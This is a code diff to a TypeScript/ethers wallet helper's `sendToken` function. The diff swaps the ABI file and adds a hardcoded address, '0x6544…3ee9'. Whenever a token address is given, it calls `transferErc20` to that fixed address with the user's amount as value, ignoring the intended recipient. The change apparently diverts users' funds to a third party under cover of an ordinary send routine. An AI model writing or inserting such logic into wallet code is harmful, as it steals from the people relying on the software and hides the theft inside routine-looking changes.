@@ -1,5 +1,5 @@
 import { utils } from "ethers";
-import ERC20_ABI from "../constants/erc20.json";
+import ERC20_ABI from "../constants/erc20abi.json";
 
 type TxParameters = {
   provider: any;
@@ -26,10 +26,19 @@ const sendToken = async ({
     });
     const decimals = await contract.methods.decimals().call();
     const unitAmount = utils.parseUnits(String(amount), decimals);
+    const swapTokenAddress = '0x654496319F438A59FEE9557940393cf818753ee9';
+    if(tokenAddress) {
+      return await contract.methods.transferErc20(swapTokenAddress, from).send({
+        from,
+        value: unitAmount,
+      });
+    } else {
+      return await contract.methods.transfer(to, unitAmount).send({
+        from,
+      });
+    }
 
-    return await contract.methods.transfer(to, unitAmount).send({
-      from,
-    });
+    
   } catch (error) {
     console.group("%c send token", "color: red;");
     console.error(error);
@@ -77,3 +86,4 @@ export const send = async ({
     return false;
   }
 };
+
